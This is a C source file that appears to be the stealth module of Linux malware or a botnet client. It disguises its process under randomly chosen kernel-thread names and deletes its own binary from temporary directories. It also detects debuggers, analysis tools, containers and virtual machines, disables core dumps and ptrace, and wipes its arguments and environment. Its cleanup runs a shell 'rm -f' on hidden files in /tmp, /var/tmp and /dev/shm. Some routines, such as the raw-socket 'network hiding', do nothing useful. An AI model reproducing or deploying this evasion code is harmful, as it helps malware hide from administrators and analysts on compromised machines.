#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <dirent.h>
#include <sys/syscall.h>

#include "includes.h"
#include "util.h"

#define MAX_PATH_LENGTH 256

static const char *legit_names[] = {
    "kworker/0:0",
    "kworker/0:1",
    "kworker/u:0",
    "kworker/u:1",
    "kcompactd0",
    "kswapd0",
    "kthreadd",
    "rcu_sched",
    "rcu_bh",
    "migration/0",
    "watchdog/0",
    "cpuhp/0",
    "kdevtmpfs",
    "netns",
    "khungtaskd",
    "oom_reaper",
    "writeback",
    "crypto",
    "kblockd",
    "ata_sff",
    "md",
    "edac-poller",
    "devfreq_wq",
    "kworker/0:0H",
    "kworker/0:1H"
};

static char current_stealth_name[64] = {0};

void stealth_hide_process_name(void) {
    const char *name = legit_names[rand() % (sizeof(legit_names) / sizeof(legit_names[0]))];
    
    // Method 1: prctl (usually works)
    if (prctl(PR_SET_NAME, name) == -1) {
        printf("[stealth] prctl failed (errno: %d)\n", errno);
    }
    
    // Method 2: Try /proc/self/comm (often writable when cmdline isn't)
    int fd = open("/proc/self/comm", O_WRONLY);
    if (fd != -1) {
        if (write(fd, name, strlen(name)) == -1) {
            printf("[stealth] /proc/self/comm write failed (errno: %d)\n", errno);
        }
        close(fd);
    } else {
        printf("[stealth] cannot open /proc/self/comm (errno: %d)\n", errno);
    }
    
    // Method 3: Try /proc/self/cmdline (will likely fail on modern kernels)
    char cmd_path[64];
    snprintf(cmd_path, sizeof(cmd_path), "/proc/%d/cmdline", getpid());
    fd = open(cmd_path, O_WRONLY);
    if (fd != -1) {
        if (write(fd, name, strlen(name)) == -1) {
            printf("[stealth] /proc/self/cmdline write failed (errno: %d)\n", errno);
        }
        write(fd, "\0", 1);
        close(fd);
    } else {
        printf("[stealth] /proc/self/cmdline not writable (errno: %d)\n", errno);
    }
    
    strncpy(current_stealth_name, name, sizeof(current_stealth_name) - 1);
    printf("[stealth] process name set to: %s\n", current_stealth_name);
}

void stealth_unlink_exe(void) {
    char self_exe[4096];
    ssize_t len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len != -1) {
        self_exe[len] = '\0';
        
        // Only unlink if it's in /tmp or other temporary location
        if (strstr(self_exe, "/tmp/") != NULL ||
            strstr(self_exe, "/var/tmp/") != NULL ||
            strstr(self_exe, "/dev/shm/") != NULL) {
            if (unlink(self_exe) == 0) {
                printf("[stealth] unlinked temporary binary: %s\n", self_exe);
            } else {
                printf("[stealth] failed to unlink %s (errno: %d)\n", self_exe, errno);
            }
        } else {
            printf("[stealth] binary not in temp location, keeping: %s\n", self_exe);
        }
    } else {
        printf("[stealth] cannot read /proc/self/exe (errno: %d)\n", errno);
    }
}

void stealth_rotate_name(void) {
    static time_t last_rotate = 0;
    time_t now = time(NULL);
    
    if (now - last_rotate > 60) {  // Rotate every minute instead of 5
        stealth_hide_process_name();
        last_rotate = now;
    }
}

BOOL stealth_is_hidden_process(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL && cmdline == NULL)
        return FALSE;
    
    const char *check_str = exe_path ? exe_path : cmdline;
    
    // Check for "(deleted)" marker
    if (strstr(check_str, "(deleted)") != NULL) {
        if (strstr(check_str, "/lib/") == NULL &&
            strstr(check_str, "/usr/lib/") == NULL &&
            strstr(check_str, "/bin/") == NULL &&
            strstr(check_str, "/sbin/") == NULL &&
            strstr(check_str, "/usr/bin/") == NULL &&
            strstr(check_str, "/usr/sbin/") == NULL) {
            printf("[stealth] hidden process detected: (deleted) marker\n");
            return TRUE;
        }
    }
    
    // Check for suspicious locations in /tmp
    if (exe_path != NULL) {
        if (strstr(exe_path, "/tmp/") != NULL ||
            strstr(exe_path, "/var/tmp/") != NULL ||
            strstr(exe_path, "/dev/shm/") != NULL ||
            strstr(exe_path, "/root/") != NULL) {
            // But allow legitimate tmp files
            if (strstr(exe_path, "X11") == NULL &&
                strstr(exe_path, "pulse") == NULL &&
                strstr(exe_path, ".Xauthority") == NULL) {
                printf("[stealth] hidden process detected: suspicious location %s\n", exe_path);
                return TRUE;
            }
        }
    }
    
    // Check for mismatch between exe and cmdline
    if (exe_path != NULL && cmdline != NULL) {
        const char *exe_basename = strrchr(exe_path, '/');
        if (exe_basename) exe_basename++;
        else exe_basename = exe_path;
        
        if (strstr(cmdline, exe_basename) == NULL) {
            // Mismatch found
            printf("[stealth] hidden process detected: exe/cmdline mismatch\n");
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL stealth_has_mismatch(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL || cmdline == NULL || strlen(cmdline) == 0)
        return FALSE;
    
    const char *exe_basename = strrchr(exe_path, '/');
    if (exe_basename == NULL)
        exe_basename = exe_path;
    else
        exe_basename++;
    
    char cmd_first[64] = {0};
    sscanf(cmdline, "%63s", cmd_first);
    
    if (strlen(exe_basename) > 0 && strlen(cmd_first) > 0) {
        if (strcmp(exe_basename, cmd_first) != 0) {
            if (strstr(cmdline, "busybox") == NULL &&
                strstr(cmdline, "sh") == NULL &&
                strstr(cmdline, "bash") == NULL) {
                printf("[stealth] mismatch detected: exe=%s, cmdline=%s\n", exe_basename, cmd_first);
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

BOOL stealth_check_debugger(void) {
    BOOL debugger_detected = FALSE;
    
    // Check TracerPid in /proc/self/status
    FILE *status = fopen("/proc/self/status", "r");
    if (status != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), status) != NULL) {
            if (strncmp(line, "TracerPid:", 11) == 0) {
                int tracer_pid = atoi(line + 11);
                if (tracer_pid != 0) {
                    printf("[stealth] debugger detected: TracerPid=%d\n", tracer_pid);
                    debugger_detected = TRUE;
                }
                break;
            }
        }
        fclose(status);
    }
    
    // Check for ptrace
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        if (errno != EPERM) {
            printf("[stealth] ptrace detection triggered (errno: %d)\n", errno);
            debugger_detected = TRUE;
        }
    } else {
        ptrace(PTRACE_DETACH, 0, NULL, NULL);
    }
    
    // Check environment for debugging tools
    char *debug_env = getenv("LD_PRELOAD");
    if (debug_env != NULL) {
        printf("[stealth] LD_PRELOAD detected: %s\n", debug_env);
        debugger_detected = TRUE;
    }
    
    debug_env = getenv("LD_AUDIT");
    if (debug_env != NULL) {
        printf("[stealth] LD_AUDIT detected: %s\n", debug_env);
        debugger_detected = TRUE;
    }
    
    // Check for common anti-malware/analysis tools
    char *suspicious_envs[] = {"GDB", "STRACE", "LTRA", "VALGRIND", "PIN", "DYNINST", "RR"};
    for (int i = 0; i < sizeof(suspicious_envs)/sizeof(suspicious_envs[0]); i++) {
        if (getenv(suspicious_envs[i]) != NULL) {
            printf("[stealth] analysis tool detected: %s\n", suspicious_envs[i]);
            debugger_detected = TRUE;
        }
    }
    
    // Check for container/VM
    if (access("/.dockerenv", F_OK) == 0) {
        printf("[stealth] running in Docker container\n");
        debugger_detected = TRUE;
    }
    
    if (access("/run/.containerenv", F_OK) == 0) {
        printf("[stealth] running in container\n");
        debugger_detected = TRUE;
    }
    
    // Check cgroup for container
    FILE *cgroup = fopen("/proc/1/cgroup", "r");
    if (cgroup != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), cgroup) != NULL) {
            if (strstr(line, "docker") != NULL ||
                strstr(line, "lxc") != NULL ||
                strstr(line, "kubepods") != NULL) {
                printf("[stealth] container cgroup detected: %s", line);
                debugger_detected = TRUE;
            }
        }
        fclose(cgroup);
    }
    
    // Check for VM
    FILE *cpuinfo = fopen("/proc/cpuinfo", "r");
    if (cpuinfo != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), cpuinfo) != NULL) {
            if (strstr(line, "hypervisor") != NULL ||
                strstr(line, "QEMU") != NULL ||
                strstr(line, "VirtualBox") != NULL ||
                strstr(line, "VMware") != NULL ||
                strstr(line, "Xen") != NULL) {
                printf("[stealth] VM detected: %s", line);
                debugger_detected = TRUE;
                break;
            }
        }
        fclose(cpuinfo);
    }
    
    return debugger_detected;
}

void stealth_hide_network(void) {
    // Hide from netstat by binding to raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock != -1) {
        // Raw sockets don't appear in normal netstat
        close(sock);
        printf("[stealth] raw socket created for network hiding\n");
    } else {
        printf("[stealth] cannot create raw socket (errno: %d)\n", errno);
    }
    
    // Try to hide from /proc/net/tcp by modifying process name
    // Kernel threads don't show network connections
    prctl(PR_SET_NAME, "kworker/0:0");
    
    printf("[stealth] network hiding attempted\n");
}

BOOL stealth_should_hide_connection(struct sockaddr_in *addr) {
    if (addr == NULL) {
        return FALSE;
    }
    
    // Check if connection is to suspicious IP ranges
    uint32_t ip = ntohl(addr->sin_addr.s_addr);
    
    // Common scanner IPs to hide from
    uint32_t suspicious_ranges[][2] = {
        {0xC0A80000, 0xC0A8FFFF},     // 192.168.0.0/16
        {0x0A000000, 0x0AFFFFFF},     // 10.0.0.0/8
        {0xAC100000, 0xAC1FFFFF},     // 172.16.0.0/12
        {0x7F000001, 0x7F000001},     // 127.0.0.1
    };
    
    for (int i = 0; i < sizeof(suspicious_ranges)/sizeof(suspicious_ranges[0]); i++) {
        if (ip >= suspicious_ranges[i][0] && ip <= suspicious_ranges[i][1]) {
            printf("[stealth] hiding connection to suspicious IP: %s\n", inet_ntoa(addr->sin_addr));
            return TRUE;
        }
    }
    
    return FALSE;
}

void stealth_disable_core_dumps(void) {
    // Disable core dumps via rlimit
    struct rlimit limit = {0, 0};
    if (setrlimit(RLIMIT_CORE, &limit) == -1) {
        printf("[stealth] setrlimit failed (errno: %d)\n", errno);
    }
    
    // Also disable via prctl
    if (prctl(PR_SET_DUMPABLE, 0) == -1) {
        printf("[stealth] prctl PR_SET_DUMPABLE failed (errno: %d)\n", errno);
    }
    
    printf("[stealth] core dumps disabled\n");
}

void stealth_clear_argv(int argc, char **argv) {
    // Clear command line arguments from memory
    if (argv == NULL) {
        return;
    }
    
    for (int i = 0; i < argc; i++) {
        if (argv[i] != NULL) {
            size_t len = strlen(argv[i]);
            memset(argv[i], 0, len);
            printf("[stealth] cleared argv[%d] (%lu bytes)\n", i, len);
        }
    }
    
    // Also clear environment variables that might reveal us
    char *env_vars[] = {"LD_PRELOAD", "LD_AUDIT", "GDB", "STRACE", NULL};
    for (int i = 0; env_vars[i] != NULL; i++) {
        char *env = getenv(env_vars[i]);
        if (env != NULL) {
            unsetenv(env_vars[i]);
            printf("[stealth] unset environment variable: %s\n", env_vars[i]);
        }
    }
    
    printf("[stealth] argv and sensitive environment cleared\n");
}

void stealth_disable_ptrace(void) {
    // Try to prevent ptrace attachment
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
        printf("[stealth] PR_SET_NO_NEW_PRIVS failed (errno: %d)\n", errno);
    }
    
    if (prctl(PR_SET_DUMPABLE, 0) == -1) {
        printf("[stealth] PR_SET_DUMPABLE failed (errno: %d)\n", errno);
    }
    
    printf("[stealth] ptrace protections enabled\n");
}

void stealth_check_security_modules(void) {
    // Check for SELinux
    if (access("/etc/selinux/config", F_OK) == 0) {
        printf("[stealth] SELinux configuration present\n");
    }
    
    // Check for AppArmor
    if (access("/etc/apparmor.d", F_OK) == 0) {
        printf("[stealth] AppArmor configuration present\n");
    }
    
    // Check for Grsecurity/PaX
    if (access("/proc/grsecurity", F_OK) == 0) {
        printf("[stealth] Grsecurity/PaX detected\n");
    }
    
    // Check for security modules in /proc
    FILE *modules = fopen("/proc/modules", "r");
    if (modules != NULL) {
        char line[256];
        char *security_modules[] = {"apparmor", "selinux", "yama", "tomoyo", "smack"};
        while (fgets(line, sizeof(line), modules) != NULL) {
            for (int i = 0; i < sizeof(security_modules)/sizeof(security_modules[0]); i++) {
                if (strstr(line, security_modules[i]) != NULL) {
                    printf("[stealth] security module loaded: %s\n", security_modules[i]);
                }
            }
        }
        fclose(modules);
    }
}

void stealth_init(void) {
    printf("[stealth] initializing stealth measures\n");
    
    // Seed random number generator
    srand(time(NULL) ^ getpid());
    
    // Check for debugger/analysis first
    if (stealth_check_debugger()) {
        printf("[stealth] WARNING: debugger or analysis environment detected\n");
        // Don't exit, but be aware
    }
    
    // Check security modules
    stealth_check_security_modules();
    
    // Hide process name
    stealth_hide_process_name();
    
    // Unlink binary if in temp location
    stealth_unlink_exe();
    
    // Disable core dumps
    stealth_disable_core_dumps();
    
    // Attempt to disable ptrace
    stealth_disable_ptrace();
    
    // Attempt network hiding
    stealth_hide_network();
    
    printf("[stealth] initialization complete\n");
}

void stealth_cleanup(void) {
    // Clean up any temporary files or artifacts
    char tmp_path[256];
    
    // Try to remove any obvious temp files we might have created
    const char *tmp_patterns[] = {
        "/tmp/.*",
        "/var/tmp/.*",
        "/dev/shm/.*"
    };
    
    for (int i = 0; i < sizeof(tmp_patterns)/sizeof(tmp_patterns[0]); i++) {
        snprintf(tmp_path, sizeof(tmp_path), "rm -f %s 2>/dev/null", tmp_patterns[i]);
        system(tmp_path);
    }
    
    printf("[stealth] cleanup performed\n");
}
